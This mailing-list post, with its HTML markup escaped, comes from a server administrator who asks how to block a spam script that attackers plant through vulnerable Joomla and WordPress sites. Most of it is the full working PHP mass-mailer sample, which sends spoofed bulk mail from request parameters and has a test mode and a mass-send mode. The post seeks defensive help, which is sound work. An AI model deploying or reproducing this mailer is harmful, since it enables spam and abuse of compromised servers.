<tt>
&lt;HTML&gt;&lt;HEAD&gt;&lt;/HEAD&gt;<br>
&lt;BODY&nbsp;dir=ltr&gt;<br>
&lt;DIV&nbsp;dir=ltr&gt;<br>
&lt;DIV&nbsp;style=&quot;FONT-SIZE:&nbsp;12pt;&nbsp;FONT-FAMILY:&nbsp;'Calibri';&nbsp;COLOR:&nbsp;#000000&quot;&gt;<br>
&lt;DIV&gt;Dear&nbsp;All,&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&lt;/DIV&gt;<br>
&lt;DIV&gt;Lately&nbsp;Iâ€™m&nbsp;facing&nbsp;lot&nbsp;of&nbsp;hackers&nbsp;were&nbsp;upload&nbsp;their&nbsp;script&nbsp;via&nbsp;buggy&nbsp;Joomla&nbsp;<br>
or&nbsp;Wordpress&nbsp;and&nbsp;run&nbsp;the&nbsp;script&nbsp;to&nbsp;sending&nbsp;thousands&nbsp;of&nbsp;spam&nbsp;mail,&nbsp;the&nbsp;sample&nbsp;of&nbsp;<br>
script&nbsp;as&nbsp;below:&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&lt;/DIV&gt;<br>
&lt;DIV&gt;---------------------------------------------------------------------------------------------------------------------------------------------&lt;/DIV&gt;<br>
&lt;DIV&gt;(mail.php)&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&lt;/DIV&gt;<br>
&lt;DIV&gt;&lt;?php&lt;/DIV&gt;<br>
&lt;DIV&gt;ini_set('mail.add_x_header','off');&lt;/DIV&gt;<br>
&lt;DIV&gt;$_testmail&nbsp;=&nbsp;$_REQUEST['TESTMAIL'];&lt;/DIV&gt;<br>
&lt;DIV&gt;$_testlink&nbsp;=&nbsp;$_REQUEST['TESTLINK'];&lt;/DIV&gt;<br>
&lt;DIV&gt;$_status&nbsp;=&nbsp;$_REQUEST['STATUS'];&lt;/DIV&gt;<br>
&lt;DIV&gt;$_snames&nbsp;=&nbsp;$_REQUEST['SNAMES'];&lt;/DIV&gt;<br>
&lt;DIV&gt;$_semails&nbsp;=&nbsp;$_REQUEST['SEMAILS'];&lt;/DIV&gt;<br>
&lt;DIV&gt;$_message&nbsp;=&nbsp;$_REQUEST['MESSAGE'];&lt;/DIV&gt;<br>
&lt;DIV&gt;$_subjects&nbsp;=&nbsp;$_REQUEST['SUBJECTS'];&lt;/DIV&gt;<br>
&lt;DIV&gt;$_ctype&nbsp;=&nbsp;$_REQUEST['CTYPE'];&lt;/DIV&gt;<br>
&lt;DIV&gt;$_spamdom&nbsp;=&nbsp;$_REQUEST['SPAMDOM'];&lt;/DIV&gt;<br>
&lt;DIV&gt;$_mlr&nbsp;=&nbsp;$_REQUEST['MAILER'];&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&lt;/DIV&gt;<br>
&lt;DIV&gt;$_SERVER['PHP_SELF']&nbsp;=&nbsp;&quot;/email.php&quot;;&lt;/DIV&gt;<br>
&lt;DIV&gt;$_SERVER['REMOTE_ADDR']&nbsp;=&nbsp;$_SERVER['SERVER_ADDR'];&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&lt;/DIV&gt;<br>
&lt;DIV&gt;$SpamDom&nbsp;=&nbsp;explode(&quot;,&quot;,&nbsp;$_spamdom);&lt;/DIV&gt;<br>
&lt;DIV&gt;$Snames&nbsp;=&nbsp;explode(&quot;,&quot;,&nbsp;$_snames);&lt;/DIV&gt;<br>
&lt;DIV&gt;$Semails&nbsp;=&nbsp;explode(&quot;,&quot;,&nbsp;$_semails);&lt;/DIV&gt;<br>
&lt;DIV&gt;$Subjects&nbsp;=&nbsp;explode(&quot;,&quot;,&nbsp;$_subjects);&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&lt;/DIV&gt;<br>
&lt;DIV&gt;$rnx&nbsp;=&nbsp;chr(rand(97,122))&nbsp;.&nbsp;chr(rand(97,122))&nbsp;.&nbsp;chr(rand(97,122))&nbsp;.&nbsp;<br>
rand(100,999);&lt;/DIV&gt;<br>
&lt;DIV&gt;$rnx.=&nbsp;chr(rand(97,122))&nbsp;.&nbsp;chr(rand(97,122))&nbsp;.&nbsp;chr(rand(97,122))&nbsp;.&nbsp;<br>
rand(100,999);&lt;/DIV&gt;<br>
&lt;DIV&gt;$rnx.=&nbsp;&quot;.&quot;&nbsp;.&nbsp;$SpamDom[array_rand($SpamDom)];&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&lt;/DIV&gt;<br>
&lt;DIV&gt;$smail&nbsp;=&nbsp;$Semails[array_rand($Semails)];&lt;/DIV&gt;<br>
&lt;DIV&gt;$_rmessage&nbsp;=&nbsp;str_replace(&quot;XXRANDOMXX&quot;,&nbsp;$rnx,&nbsp;$_message);&lt;/DIV&gt;<br>
&lt;DIV&gt;$_message&nbsp;=&nbsp;str_replace(&quot;\n&quot;,&nbsp;&quot;\r\n&quot;,&nbsp;$_rmessage);&lt;/DIV&gt;<br>
&lt;DIV&gt;$_from&nbsp;=&nbsp;$Semails[array_rand($Semails)];&lt;/DIV&gt;<br>
&lt;DIV&gt;$_subject&nbsp;=&nbsp;$Subjects[array_rand($Subjects)];&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&lt;/DIV&gt;<br>
&lt;DIV&gt;$_ctype&nbsp;=&nbsp;stripslashes($_ctype);&lt;/DIV&gt;<br>
&lt;DIV&gt;$message&nbsp;&nbsp;=&nbsp;urlencode($_message);&lt;/DIV&gt;<br>
&lt;DIV&gt;$message&nbsp;&nbsp;=&nbsp;ereg_replace(&quot;%5C%22&quot;,&nbsp;&quot;%22&quot;,&nbsp;$message);&lt;/DIV&gt;<br>
&lt;DIV&gt;$message&nbsp;&nbsp;=&nbsp;urldecode($message);&lt;/DIV&gt;<br>
&lt;DIV&gt;$_from&nbsp;=&nbsp;stripslashes($_from);&lt;/DIV&gt;<br>
&lt;DIV&gt;$_message&nbsp;&nbsp;=&nbsp;stripslashes($message);&lt;/DIV&gt;<br>
&lt;DIV&gt;$_subject&nbsp;&nbsp;=&nbsp;stripslashes($_subject);&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&lt;/DIV&gt;<br>
&lt;DIV&gt;$headers&nbsp;&nbsp;&nbsp;=&nbsp;array();&lt;/DIV&gt;<br>
&lt;DIV&gt;$headers[]&nbsp;=&nbsp;&quot;From:&nbsp;$_from&quot;;&lt;/DIV&gt;<br>
&lt;DIV&gt;$headers[]&nbsp;=&nbsp;&quot;X-Priority:&nbsp;3&quot;;&lt;/DIV&gt;<br>
&lt;DIV&gt;$headers[]&nbsp;=&nbsp;&quot;X-Mailer:&nbsp;$_mlr&quot;;&lt;/DIV&gt;<br>
&lt;DIV&gt;$headers[]&nbsp;=&nbsp;&quot;MIME-Version:&nbsp;1.0&quot;;&lt;/DIV&gt;<br>
&lt;DIV&gt;$headers[]&nbsp;=&nbsp;&quot;Content-type:&nbsp;$_ctype;&nbsp;charset=\&quot;UTF-8\&quot;&quot;;&lt;/DIV&gt;<br>
&lt;DIV&gt;$headers[]&nbsp;=&nbsp;&quot;Content-Transfer-Encoding:&nbsp;quoted-printable&quot;;&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&lt;/DIV&gt;<br>
&lt;DIV&gt;foreach&nbsp;($headers&nbsp;as&nbsp;$key=&gt;$value)&nbsp;{&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$headers[$key]&nbsp;=&nbsp;<br>
stripslashes($value);&lt;/DIV&gt;<br>
&lt;DIV&gt;}&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&lt;/DIV&gt;<br>
&lt;DIV&gt;if($_status&nbsp;==&nbsp;&quot;CHECK&quot;)&nbsp;{&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($_testmail&nbsp;==&nbsp;NULL)&nbsp;return&nbsp;<br>
0;&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($_from&nbsp;==&nbsp;NULL)&nbsp;return&nbsp;<br>
0;&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($_message&nbsp;==&nbsp;NULL)&nbsp;return&nbsp;<br>
0;&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($_subject&nbsp;==&nbsp;NULL)&nbsp;return&nbsp;<br>
0;&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_subject&nbsp;=&nbsp;$_subject&nbsp;.&nbsp;&quot;&nbsp;&quot;&nbsp;.&nbsp;<br>
$_testlink;&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mail($_testmail,&nbsp;$_subject,&nbsp;<br>
$_message,&nbsp;implode(&quot;\r\n&quot;,&nbsp;$headers));&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;<br>
&quot;$_testmail\n\n$_message\n\n$_from\n\n$_subject&quot;;&lt;/DIV&gt;<br>
&lt;DIV&gt;}&lt;/DIV&gt;<br>
&lt;DIV&gt;elseif($_status&nbsp;==&nbsp;&quot;MASS&quot;)&nbsp;{&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$_maillist&nbsp;=&nbsp;<br>
$_REQUEST['MAILLIST'];&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$emails&nbsp;=&nbsp;explode(&quot;,&quot;,&nbsp;<br>
$_maillist);&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($_from&nbsp;==&nbsp;NULL)&nbsp;return&nbsp;<br>
0;&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($_message&nbsp;==&nbsp;NULL)&nbsp;return&nbsp;<br>
0;&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($_subject&nbsp;==&nbsp;NULL)&nbsp;return&nbsp;<br>
0;&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach($emails&nbsp;as&nbsp;$email)&nbsp;<br>
{&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
if($email&nbsp;==&nbsp;NULL)&nbsp;$email&nbsp;=&nbsp;$_testmail;&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
mail($email,&nbsp;$_subject,&nbsp;$_message,&nbsp;implode(&quot;\r\n&quot;,&nbsp;$headers));&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
print&nbsp;&quot;$email&nbsp;-&nbsp;SENT\r\n&quot;;&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&lt;/DIV&gt;<br>
&lt;DIV&gt;}&lt;/DIV&gt;<br>
&lt;DIV&gt;else&nbsp;{&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;SENDER&nbsp;UP&quot;;&lt;/DIV&gt;<br>
&lt;DIV&gt;}&lt;/DIV&gt;<br>
&lt;DIV&gt;?&gt;&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&lt;/DIV&gt;<br>
&lt;DIV&gt;------------------------------------------------------------------------------------------------------------------------&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&lt;/DIV&gt;<br>
&lt;DIV&gt;Hopefully&nbsp;theres&nbsp;an&nbsp;idea&nbsp;how&nbsp;can&nbsp;I&nbsp;prevent&nbsp;the&nbsp;hackers&nbsp;to&nbsp;run&nbsp;that&nbsp;script&nbsp;<br>
by&nbsp;mod&nbsp;security&nbsp;rules.&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&lt;/DIV&gt;<br>
&lt;DIV&gt;Please&nbsp;help&nbsp;and&nbsp;Thank&nbsp;you&nbsp;so&nbsp;much&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&lt;/DIV&gt;<br>
&lt;DIV&gt;&nbsp;&lt;/DIV&gt;&lt;/DIV&gt;&lt;/DIV&gt;&lt;/BODY&gt;&lt;/HTML&gt;<br>

</tt>
